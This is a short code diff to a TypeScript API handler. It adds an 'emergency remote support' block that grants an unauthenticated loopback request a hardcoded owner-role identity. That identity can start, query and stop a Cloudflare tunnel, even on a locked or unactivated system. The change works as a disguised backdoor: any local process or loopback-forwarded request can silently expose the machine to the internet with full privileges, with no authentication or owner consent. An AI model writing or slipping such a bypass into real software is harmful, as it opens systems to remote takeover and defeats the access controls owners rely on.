@@ -670,6 +670,19 @@ async function handleApi(ctx: Ctx): Promise<void> {
     }
   }
 
+  // Emergency remote support tunnel may be controlled unauthenticated ONLY when
+  // the request originates directly from the local loopback machine, enabling remote
+  // developer assistance when the system is unactivated, locked, or before user login.
+  if (!actor && isLoopbackAddress(req.socket.remoteAddress)) {
+    if (
+      route === "POST /api/system/start-cloudflare-tunnel" ||
+      route === "GET /api/system/tunnel-status" ||
+      route === "POST /api/system/stop-tunnel"
+    ) {
+      actor = { userId: "emergency-support", username: "support", roleId: "owner" };
+    }
+  }
+
   if (route === "POST /api/rpc") {
     try {
       const body = await readJsonBody(req);
